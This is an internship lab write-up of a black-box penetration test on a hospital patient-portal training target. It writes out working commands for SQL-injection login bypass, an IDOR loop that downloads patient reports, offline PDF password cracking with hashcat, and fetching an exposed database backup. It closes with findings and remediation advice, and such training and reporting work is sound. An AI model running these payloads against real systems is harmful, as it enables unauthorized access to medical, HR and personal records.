# Cyber Security Internship — B084 — Lab Week 4
## Mediroza General Hospital — Web Application Penetration Test (Training Lab)
## Overview

| Field | Detail |
|---|---|
| **Target** | medirozahospital.com (199.188.201.16) |
| **Type** | Black-box Web Application Penetration Test |
| **Category** | Healthcare patient-portal CMS (lab environment) |
| **Overall Risk** | 🟠 High |
| **Tools Used** | WhatWeb, curl, Firefox DevTools, pdf2john, hashcat, John the Ripper, exiftool, qpdf, pdftotext, Python3, sha256sum |

---

## 1. Executive Summary

A black-box assessment of the Mediroza patient portal identified a **SQL injection vulnerability** in the login form, allowing authentication bypass without valid credentials. This led to an **Insecure Direct Object Reference (IDOR)** in the report download endpoint, exposing multiple confidential pathology reports. The retrieved PDFs were password-protected; all passwords were cracked offline using hashcat. Metadata inside one PDF led to the discovery of a publicly exposed internal database backup containing HR and shareholder records.

---

## 2. Scope and Methodology

- **Scope:** `medirozahospital.com` only.
- **Approach:** Recon → directory discovery → authentication testing → exploitation → offline PDF cracking → metadata analysis → secondary exposure discovery → reporting.
- **Limitations:** Automated SQLi tools returned HTTP 403; manual curl-based testing was used instead.

---

## 3. Attack Walkthrough (matches repo screenshot order)

### 📸 `1st.png`, `2 chunk A.png`, `3 chunk B.png` — Reconnaissance
Initial fingerprinting and directory setup:
```bash
whatweb -a 3 https://medirozahospital.com | tee 01_recon/whatweb.txt
curl -sSI https://medirozahospital.com | tee 01_recon/headers.txt
curl -sS https://medirozahospital.com/robots.txt | tee 01_recon/robots.txt
```
**Findings:** Server fingerprint `LiteSpeed`, `PHP/8.2.36`, `Mediroza CMS 1.4.2`. `robots.txt` disclosed `/patient/`, `/staff/`, `/old/` — all with directory listing enabled.

### 📸 `23 mediroza pentester.png`, `55 mediroza pentester.png` — SQL Injection Testing
Looping common SQLi auth-bypass payloads against the login endpoint:
```bash
for p in "admin' -- -" "admin'--" "' OR 1=1 -- -"; do
  curl -sS -o /dev/null -w "%{http_code}" -c cookies.txt \
    --data-urlencode "username=$p" --data-urlencode "password=x" \
    https://medirozahospital.com/patient/login.php
done
```

### 📸 `patient portal.jpeg` — Successful Authentication Bypass
Payload `admin' -- -` returned **HTTP 302 → portal.php** with a new session cookie, confirming auth bypass.

| Detail | Value |
|---|---|
| **Vulnerability** | SQL Injection → Authentication Bypass |
| **CWE** | CWE-89 |
| **Severity** | High |
| **Endpoint** | `POST /patient/login.php` |

### 📸 `patients1.png`–`patients7.png`, `1st patient.jpeg`, `2nd patient.jpeg`, `3rd patient.jpeg`, `all pdfs.jpeg` — IDOR & Report Retrieval
With a valid session, `download.php?id=N` was tested:
```bash
for i in 1 2 3 4 5 6; do
  curl -sS -b cookies.txt -o report_$i.pdf \
    "https://medirozahospital.com/patient/download.php?id=$i" \
    -w "id=$i → HTTP %{http_code} %{size_download} bytes\n"
done
```
IDs 1–3 returned valid PDFs; IDs 4–6 returned 404 — confirming sequential IDOR with no ownership check.

| Detail | Value |
|---|---|
| **Vulnerability** | Insecure Direct Object Reference (IDOR) |
| **CWE** | CWE-639 |
| **Severity** | High |
| **Endpoint** | `GET /patient/download.php?id=N` |

### 📸 `4.M2-02_encryption_strings.png` — PDF Encryption Analysis
```bash
for f in 03_encrypted/*.pdf; do
  strings "$f" | grep -E '/Encrypt|/Filter|/V |/R |/P '
done
```
**Finding:** All PDFs used PDF Standard Security Handler (V2/R3, 128-bit).

### 📸 `hashes1.png`–`hashes6.png` — Offline Password Cracking
Hashes extracted with `pdf2john` and cracked with `hashcat -m 10500`:
```bash
pdf2john report_1.pdf > h1.hash
hashcat -m 10500 h1.hash /tmp/rockyou.txt
hashcat -m 10500 h1.hash /tmp/rockyou.txt --show
```
All three passwords cracked in under a minute combined (weak passwords including dictionary words).

| Detail | Value |
|---|---|
| **Vulnerability** | Weak PDF Encryption Passwords |
| **CWE** | CWE-521 |
| **Severity** | Medium |

### Metadata-Driven Secondary Discovery
Extracted text/metadata from a cracked PDF revealed an internal note referencing a database backup moved to `/old/`:
```bash
curl -sS -o db_backup.sql https://medirozahospital.com/old/db_backup.sql
sha256sum db_backup.sql
```
**Result:** Backup downloaded with no authentication — contained full HR and shareholder database.

| Detail | Value |
|---|---|
| **Vulnerability** | Public Exposure of Sensitive Database Backup |
| **CWE** | CWE-552 |
| **Severity** | High |

---

## 4. Findings Summary

| ID | Finding | Severity |
|---|---|---|
| F-01 | SQL Injection Authentication Bypass | 🟠 High |
| F-02 | Public Exposure of HR Database Backup | 🟠 High |
| F-03 | Directory Indexing and Path Disclosure | 🟡 Medium |
| F-04 | IDOR on Patient Report Download | 🟠 High |
| F-05 | Weak PDF Encryption Passwords | 🟡 Medium |
| F-06 | Information Disclosure via Document Metadata | 🟡 Medium |
| F-07 | Server and CMS Fingerprinting | 🟢 Low |

---

## 5. Recommendations

- Parameterize all database queries.
- Enforce server-side ownership checks on object-reference endpoints.
- Disable directory listing; remove unused `/old/` content.
- Enforce strong passwords for protected documents.
- Strip metadata from downloadable documents.
- Remove publicly accessible backup files; store outside web root.
- Minimize version-revealing server headers.

---

## 6. Tools & Skills Demonstrated

`Reconnaissance` · `Manual SQL Injection` · `Authentication Bypass` · `IDOR / Broken Access Control` · `Offline Password Cracking (hashcat)` · `PDF Forensics & Metadata Analysis` · `Professional Report Writing`

---

*Submitted as part of Cyber Security Internship — Lab Week 4 (B084).*
